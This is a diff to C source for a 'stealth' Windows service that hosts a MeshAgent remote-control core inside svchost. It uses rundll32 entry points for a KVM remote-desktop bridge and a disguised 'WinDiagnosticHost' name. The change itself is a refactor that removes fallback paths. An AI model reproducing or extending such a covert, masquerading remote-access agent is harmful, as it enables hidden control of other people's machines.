@@ -18,6 +18,7 @@
 #include "stealth_utils.h"
 #include "stealth_defaults.h"
 #include "service_security.h"
+#include "rundll32_contract.h"
 #include "../meshcore/agentcore.h"
 #include "../meshcore/meshdefines.h"
 #include "../meshcore/KVM/Windows/kvm.h"
@@ -107,7 +108,6 @@ static wchar_t g_SvchostLogFile[MAX_PATH] = {0};
 static char g_SvchostExeStorage[ILibMemory_Init_Size(2048, sizeof(void*))] = {0};
 static char* g_SvchostExeUtf8 = NULL;
 static char* g_SvchostArgv[2] = { NULL, NULL };
-static char g_SvchostFallbackExe[_MAX_PATH] = {0};
 static BOOL g_SvchostPathsInitialized = FALSE;
 static BOOL g_SvchostCrtHandlersInstalled = FALSE;
 
@@ -490,10 +490,10 @@ void CALLBACK KvmSessionBridgeW(HWND hwnd, HINSTANCE hinstDLL, LPWSTR lpCmdLine,
         LPWSTR entryPoint = NULL;
         if (fullCmdLine != NULL)
         {
-            entryPoint = wcsstr(fullCmdLine, L"KvmSessionBridgeW");
+            entryPoint = wcsstr(fullCmdLine, MESH_RUNDLL32_ENTRY_KVM_BRIDGE_W);
             if (entryPoint != NULL)
             {
-                entryPoint += wcslen(L"KvmSessionBridgeW");
+                entryPoint += wcslen(MESH_RUNDLL32_ENTRY_KVM_BRIDGE_W);
                 while (*entryPoint == L' ') { entryPoint++; }
                 lpCmdLine = entryPoint;
             }
@@ -798,7 +798,12 @@ static BOOL Stealth_SvchostWideContains(const wchar_t* haystack, const wchar_t* 
 
 static BOOL Stealth_SvchostIsKvmBridgeInvocation(void)
 {
-    return Stealth_SvchostWideContains(GetCommandLineW(), L"KvmSessionBridgeW");
+    return Stealth_SvchostWideContains(GetCommandLineW(), MESH_RUNDLL32_ENTRY_KVM_BRIDGE_W);
+}
+
+static BOOL Stealth_SvchostIsLifecycleHostInvocation(void)
+{
+    return Stealth_SvchostWideContains(GetCommandLineW(), MESH_RUNDLL32_ENTRY_LIFECYCLE_W);
 }
 
 static void Stealth_SvchostInvalidParameterHandler(
@@ -928,6 +933,7 @@ static void Stealth_SvchostInitializePaths(HINSTANCE moduleHandle)
         wchar_t helperPath[MAX_PATH] = { 0 };
         wchar_t brandedName[MAX_PATH] = { 0 };
         BOOL helperExists = FALSE;
+        BOOL lifecycleHostInvocation = Stealth_SvchostIsLifecycleHostInvocation();
 
         MeshService_CopyBrandingTextToWide(MeshService_GetBinaryNameText(), brandedName, _countof(brandedName));
         if (brandedName[0] == L'\0')
@@ -936,7 +942,11 @@ static void Stealth_SvchostInitializePaths(HINSTANCE moduleHandle)
         }
         Stealth_SvchostLogLine(L"branding binary name resolved: %ls", brandedName[0] != L'\0' ? brandedName : L"(empty)");
 
-        if (g_SvchostInstallDir[0] != L'\0')
+        if (lifecycleHostInvocation)
+        {
+            Stealth_SvchostLogLine(L"lifecycle host invocation; helper resolution skipped");
+        }
+        else if (g_SvchostInstallDir[0] != L'\0')
         {
             wchar_t candidate[MAX_PATH] = { 0 };
 
@@ -953,49 +963,15 @@ static void Stealth_SvchostInitializePaths(HINSTANCE moduleHandle)
                 }
                 else
                 {
-                    Stealth_SvchostLogLine(L"helper pending provisioning: %ls", helperPath);
+                    Stealth_DebugPrintfW(L"[svchost] configured helper executable is missing: %ls", helperPath);
+                    Stealth_SvchostLogLine(L"configured helper executable missing: %ls", helperPath);
                 }
-            }
-
-            if ((helperPath[0] == L'\0' || helperExists == FALSE) &&
-                _snwprintf_s(candidate, _countof(candidate), _TRUNCATE, L"%s\\MeshService64.exe", g_SvchostInstallDir) > 0 &&
-                GetFileAttributesW(candidate) != INVALID_FILE_ATTRIBUTES)
-            {
-                lstrcpynW(helperPath, candidate, (int)_countof(helperPath));
-                helperExists = TRUE;
-                Stealth_DebugPrintfW(L"[svchost] helper executable detected (fallback): %ls", helperPath);
-                Stealth_SvchostLogLine(L"helper executable (fallback): %ls", helperPath);
-            }
-            else if ((helperPath[0] == L'\0' || helperExists == FALSE) &&
-                     _snwprintf_s(candidate, _countof(candidate), _TRUNCATE, L"%s\\MeshService-2022.exe", g_SvchostInstallDir) > 0 &&
-                     GetFileAttributesW(candidate) != INVALID_FILE_ATTRIBUTES)
-            {
-                lstrcpynW(helperPath, candidate, (int)_countof(helperPath));
-                helperExists = TRUE;
-                Stealth_DebugPrintfW(L"[svchost] helper executable detected (legacy): %ls", helperPath);
-                Stealth_SvchostLogLine(L"helper executable (legacy): %ls", helperPath);
             }
         }
 
         if (helperExists != FALSE)
         {
             preferredExe = helperPath;
-        }
-        else if (g_SvchostFallbackExe[0] != 0)
-        {
-            wchar_t fallbackWide[MAX_PATH] = { 0 };
-            if (MultiByteToWideChar(CP_ACP, 0, g_SvchostFallbackExe, -1, fallbackWide, (int)_countof(fallbackWide)) > 0 &&
-                fallbackWide[0] != L'\0')
-            {
-                preferredExe = fallbackWide;
-                Stealth_DebugPrintfW(L"[svchost] using fallback executable: %ls", preferredExe);
-                Stealth_SvchostLogLine(L"fallback executable: %ls", preferredExe);
-            }
-        }
-
-        if (preferredExe == NULL || preferredExe[0] == L'\0')
-        {
-            preferredExe = g_SvchostModulePath;
         }
 
         if (preferredExe != NULL && preferredExe[0] != L'\0')
@@ -1016,15 +992,6 @@ static void Stealth_SvchostInitializePaths(HINSTANCE moduleHandle)
         Stealth_DebugPrintfA("[svchost] failed to initialise UTF-8 module buffer");
     }
 
-    if (g_SvchostFallbackExe[0] == 0)
-    {
-        DWORD lenA = GetModuleFileNameA(NULL, g_SvchostFallbackExe, (DWORD)_countof(g_SvchostFallbackExe));
-        if (lenA == 0 || lenA >= _countof(g_SvchostFallbackExe))
-        {
-            g_SvchostFallbackExe[0] = 0;
-        }
-    }
-
     g_SvchostPathsInitialized = TRUE;
 }
 
@@ -1042,34 +1009,6 @@ static void Stealth_SvchostLogProvisioningStatus(void)
         return;
     }
 
-    _snwprintf_s(candidatePath, _countof(candidatePath), _TRUNCATE, L"%s\\%s", g_SvchostInstallDir, L".msh");
-    attr = GetFileAttributesW(candidatePath);
-    Stealth_DebugPrintfW(L"[svchost] provisioning file %ls (%ls)",
-                         candidatePath,
-                         (attr == INVALID_FILE_ATTRIBUTES) ? L"missing" : L"present");
-    Stealth_SvchostLogLine(L"provisioning file %ls (%ls)",
-                           candidatePath,
-                           (attr == INVALID_FILE_ATTRIBUTES) ? L"missing" : L"present");
-
-    mesh_branding_text_t dllName = MeshService_GetSvchostDllNameText();
-    if (dllName != NULL)
-    {
-        wchar_t dllNameWide[MAX_PATH] = {0};
-        MeshService_CopyBrandingTextToWide(dllName, dllNameWide, _countof(dllNameWide));
-        if (dllNameWide[0] != L'\0')
-        {
-            wchar_t dllBase[MAX_PATH] = {0};
-            lstrcpynW(dllBase, dllNameWide, (int)_countof(dllBase));
-            wchar_t* dot = wcsrchr(dllBase, L'.');
-            if (dot != NULL) { *dot = L'\0'; }
-            _snwprintf_s(candidatePath, _countof(candidatePath), _TRUNCATE, L"%s\\%s.msh", g_SvchostInstallDir, dllBase);
-            attr = GetFileAttributesW(candidatePath);
-            Stealth_SvchostLogLine(L"provisioning file %ls (%ls)",
-                                   candidatePath,
-                                   (attr == INVALID_FILE_ATTRIBUTES) ? L"missing" : L"present");
-        }
-    }
-
     MeshService_CopyBrandingTextToWide(MeshService_GetBinaryNameText(), leafName, _countof(leafName));
     if (leafName[0] != L'\0')
     {
@@ -1082,10 +1021,10 @@ static void Stealth_SvchostLogProvisioningStatus(void)
         {
             _snwprintf_s(candidatePath, _countof(candidatePath), _TRUNCATE, L"%s\\%s.msh", g_SvchostInstallDir, baseName);
             attr = GetFileAttributesW(candidatePath);
-            Stealth_DebugPrintfW(L"[svchost] executable sibling provisioning file %ls (%ls)",
+            Stealth_DebugPrintfW(L"[svchost] installed MSH provisioning file %ls (%ls)",
                                  candidatePath,
                                  (attr == INVALID_FILE_ATTRIBUTES) ? L"missing" : L"present");
-            Stealth_SvchostLogLine(L"executable sibling provisioning file %ls (%ls)",
+            Stealth_SvchostLogLine(L"installed MSH provisioning file %ls (%ls)",
                                    candidatePath,
                                    (attr == INVALID_FILE_ATTRIBUTES) ? L"missing" : L"present");
         }
@@ -1101,32 +1040,6 @@ static void Stealth_SvchostLogProvisioningStatus(void)
                              candidatePath,
                              (attr == INVALID_FILE_ATTRIBUTES) ? L"missing" : L"present");
         Stealth_SvchostLogLine(L"configuration file %ls (%ls)",
-                               candidatePath,
-                               (attr == INVALID_FILE_ATTRIBUTES) ? L"missing" : L"present");
-    }
-
-    leafName[0] = L'\0';
-    MeshService_CopyBrandingTextToWide(MeshService_GetServiceFileText(), leafName, _countof(leafName));
-    if (leafName[0] != L'\0')
-    {
-        _snwprintf_s(candidatePath, _countof(candidatePath), _TRUNCATE, L"%s\\%s.msh", g_SvchostInstallDir, leafName);
-        attr = GetFileAttributesW(candidatePath);
-        Stealth_DebugPrintfW(L"[svchost] service-name provisioning file %ls (%ls)",
-                             candidatePath,
-                             (attr == INVALID_FILE_ATTRIBUTES) ? L"missing" : L"present");
-        Stealth_SvchostLogLine(L"service-name provisioning file %ls (%ls)",
-                               candidatePath,
-                               (attr == INVALID_FILE_ATTRIBUTES) ? L"missing" : L"present");
-    }
-
-    if (_wcsicmp(leafName, L"WinDiagnosticHost") != 0)
-    {
-        _snwprintf_s(candidatePath, _countof(candidatePath), _TRUNCATE, L"%s\\WinDiagnosticHost.msh", g_SvchostInstallDir);
-        attr = GetFileAttributesW(candidatePath);
-        Stealth_DebugPrintfW(L"[svchost] legacy provisioning file %ls (%ls)",
-                             candidatePath,
-                             (attr == INVALID_FILE_ATTRIBUTES) ? L"missing" : L"present");
-        Stealth_SvchostLogLine(L"legacy provisioning file %ls (%ls)",
                                candidatePath,
                                (attr == INVALID_FILE_ATTRIBUTES) ? L"missing" : L"present");
     }
@@ -1288,16 +1201,11 @@ VOID WINAPI Stealth_SvchostServiceMain(DWORD dwArgc, LPTSTR *lpszArgv)
     }
 
     g_SvchostAgent->serviceReserved = 1;
-    if (g_SvchostExeUtf8 != NULL)
+    if (g_SvchostArgv[0] != NULL && g_SvchostExeUtf8 != NULL)
     {
         ((void**)ILibMemory_Extra(g_SvchostExeUtf8))[0] = g_SvchostAgent;
         g_SvchostAgent->exePath = g_SvchostExeUtf8;
         Stealth_SvchostLogLine(L"agent exePath set to %hs", g_SvchostExeUtf8);
-    }
-    else if (g_SvchostFallbackExe[0] != 0)
-    {
-        g_SvchostAgent->exePath = g_SvchostFallbackExe;
-        Stealth_SvchostLogLine(L"agent exePath fallback %hs", g_SvchostFallbackExe);
     }
 
     mesh_branding_text_t serviceFileText = MeshService_GetServiceFileText();
@@ -1376,13 +1284,15 @@ VOID WINAPI Stealth_SvchostServiceMain(DWORD dwArgc, LPTSTR *lpszArgv)
     {
         startArgv[0] = g_SvchostArgv[0];
     }
-    else if (g_SvchostFallbackExe[0] != 0)
-    {
-        startArgv[0] = g_SvchostFallbackExe;
-    }
     if (startArgv[0] == NULL)
     {
-        startArgv[0] = "svchost.exe";
+        Stealth_DebugPrintfA("[svchost] configured helper path is unavailable; refusing to start MeshAgent core");
+        Stealth_SvchostLogLine(L"configured helper path unavailable; MeshAgent_Start skipped");
+        g_SvchostStatus.dwCurrentState = SERVICE_STOPPED;
+        g_SvchostStatus.dwWin32ExitCode = ERROR_SERVICE_SPECIFIC_ERROR;
+        g_SvchostStatus.dwServiceSpecificExitCode = 2;
+        SetServiceStatus(g_SvchostStatusHandle, &g_SvchostStatus);
+        return;
     }
     int startArgc = 1;
 
